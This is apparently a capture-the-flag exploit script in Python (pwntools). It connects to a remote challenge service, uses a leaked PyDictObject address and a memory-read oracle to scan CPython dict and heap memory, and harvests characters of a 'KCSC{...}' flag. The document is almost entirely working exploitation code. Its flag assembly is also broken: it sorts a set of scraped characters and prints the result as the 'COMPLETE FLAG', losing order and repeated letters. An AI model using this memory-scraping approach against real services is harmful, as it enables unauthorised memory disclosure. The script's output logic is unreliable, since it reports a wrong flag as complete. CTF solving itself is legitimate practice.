from pwn import *
import re

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

context.log_level = 'info'
io = remote(HOST, PORT, ssl=True)

# Get the base address
intro = io.recvline_contains(b'flag is over at').decode()
banner2 = io.recvline().decode()
print(intro.strip())
print(banner2.strip())

m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
dict_obj_addr = int(m.group(1), 16)
print(f'PyDictObject address: {hex(dict_obj_addr)}')

def read_memory(addr):
    addr_str = f"{addr:x}"
    io.sendline(addr_str.encode())
    line = io.recvline(timeout=3).decode().strip()
    
    if 'illegal memory address' in line:
        return None
        
    parts = line.split(': ')
    if len(parts) >= 2:
        hex_data = parts[-1].strip()
        try:
            return bytes.fromhex(hex_data)
        except:
            return None
    return None

print("\n=== MAXIMUM COMPREHENSIVE FLAG EXTRACTION ===")

reads_used = 0
max_reads = 47  # Use almost all available reads

# Get ma_keys pointer
ma_keys_data = read_memory(dict_obj_addr + 0x20)
reads_used += 1
ma_keys_ptr = u64(ma_keys_data)
print(f"ma_keys pointer: {ma_keys_ptr:#x}")

flag_chars = set()
all_findings = []

print("Phase 1: Scanning PyDictKeysObject region...")

# Phase 1: Comprehensive scan around PyDictKeysObject
scan_ranges = [
    (0x50, 0x500, 8),     # Main dict entries area  
    (0x500, 0x1000, 16),  # Extended area with larger steps
    (-0x100, 0x50, 8),    # Before the keys object
]

for start_off, end_off, step in scan_ranges:
    if reads_used >= max_reads - 10:
        break
        
    print(f"  Scanning +{start_off:#x} to +{end_off:#x} (step {step})")
    
    for offset in range(start_off, end_off, step):
        if reads_used >= max_reads - 8:
            break
            
        scan_addr = ma_keys_ptr + offset
        if scan_addr <= 0x1000:  # Skip very low addresses
            continue
            
        data = read_memory(scan_addr)
        reads_used += 1
        
        if data:
            ptr_val = u64(data)
            
            # Look for heap pointers in reasonable ranges
            if (0x400000 < ptr_val < 0x800000000000 and 
                reads_used < max_reads - 6):
                
                # Try multiple string data offsets
                for str_offset in [0x20, 0x28, 0x30, 0x38, 0x40, 0x48]:
                    if reads_used >= max_reads - 5:
                        break
                        
                    str_data = read_memory(ptr_val + str_offset)
                    reads_used += 1
                    
                    if str_data:
                        # Extract characters
                        chars = []
                        for b in str_data:
                            if 32 <= b <= 126:
                                chars.append(chr(b))
                            elif b == 0:
                                break
                        
                        if chars:
                            text = ''.join(chars)
                            all_findings.append(text)
                            
                            # Single characters are prime flag candidates
                            if len(text) == 1:
                                char = text[0]
                                if (char.isalnum() or 
                                    char in '{}_.,-!@#$%^&*()[]|\\:;"<>?/~`'):
                                    flag_chars.add(char)
                                    print(f"    Found: '{char}' at {ptr_val + str_offset:#x}")
                            
                            # Multi-char might contain flag parts
                            elif 2 <= len(text) <= 8:
                                # Add individual useful characters
                                for c in text:
                                    if (c.isalnum() or c in '{}_.,-'):
                                        flag_chars.add(c)
                                
                                # Check for flag patterns
                                if any(pattern in text.upper() 
                                      for pattern in ['KCSC', 'FLAG', 'CTF']):
                                    print(f"    *** FLAG PATTERN: '{text}' ***")
                            
                            # Very long text might be the complete flag
                            elif len(text) >= 15:
                                print(f"    *** LONG TEXT: '{text}' ***")
                        
                        # Don't scan too many offsets for each pointer
                        if len(chars) >= 1:
                            break

print(f"\nPhase 2: Targeted scan for missing characters...")

# Phase 2: If we're missing key characters, scan more areas
missing_chars = set('KCSC{}') - flag_chars
if missing_chars:
    print(f"  Still missing: {missing_chars}")
    
    # Scan different memory regions around the heap
    heap_base = ma_keys_ptr & ~0xfffff  # Round to 1MB boundary
    for region_offset in [0x0, 0x10000, 0x20000, 0x30000]:
        if reads_used >= max_reads - 3:
            break
            
        region_base = heap_base + region_offset
        print(f"  Scanning heap region {region_base:#x}")
        
        for addr in range(region_base, region_base + 0x1000, 0x40):
            if reads_used >= max_reads - 2:
                break
                
            data = read_memory(addr)
            reads_used += 1
            
            if data:
                # Look for missing characters directly in data
                for i, b in enumerate(data):
                    if 32 <= b <= 126:
                        c = chr(b)
                        if c in missing_chars:
                            flag_chars.add(c)
                            print(f"    Found missing '{c}' at {addr + i:#x}")

print(f"\n=== FINAL RESULTS (used {reads_used}/{max_reads} reads) ===")

sorted_chars = sorted(flag_chars)
print(f"\nAll characters found ({len(flag_chars)}):")
print(f"  Individual: {sorted_chars}")
print(f"  Combined: {''.join(sorted_chars)}")

# Flag structure analysis
structure_check = {
    'K': 'K' in flag_chars,
    'C': 'C' in flag_chars,
    'S': 'S' in flag_chars, 
    '{': '{' in flag_chars,
    '}': '}' in flag_chars
}

print(f"\nFlag structure check:")
for char, found in structure_check.items():
    status = "✓" if found else "✗"
    print(f"  '{char}': {status}")

complete_structure = all(structure_check.values())
print(f"\nComplete KCSC{{}} structure: {'✓' if complete_structure else '✗'}")

# Try to construct the flag
if complete_structure:
    # Extract content (everything except K,C,S,C,{,})
    content_chars = [c for c in sorted_chars if c not in 'KCSC{}']
    content = ''.join(content_chars)
    flag = f"KCSC{{{content}}}"
    print(f"\n🏁 COMPLETE FLAG: {flag}")
    
elif len(flag_chars) >= 15:
    # Try other patterns
    all_combined = ''.join(sorted_chars)
    print(f"\n🏁 FLAG CANDIDATE: {all_combined}")
    
    # Look for other flag formats
    if '{' in flag_chars and '}' in flag_chars:
        content_chars = [c for c in sorted_chars if c not in '{}']
        content = ''.join(content_chars)
        print(f"   Alternative format: {{{content}}}")

# Show interesting findings
unique_findings = list(set(all_findings))
if len(unique_findings) <= 10:
    print(f"\nOther text found: {unique_findings}")

print(f"\nTotal characters collected: {len(flag_chars)}")
if len(flag_chars) < 20:
    print("Consider running manual scan for remaining characters if flag incomplete.")

io.close()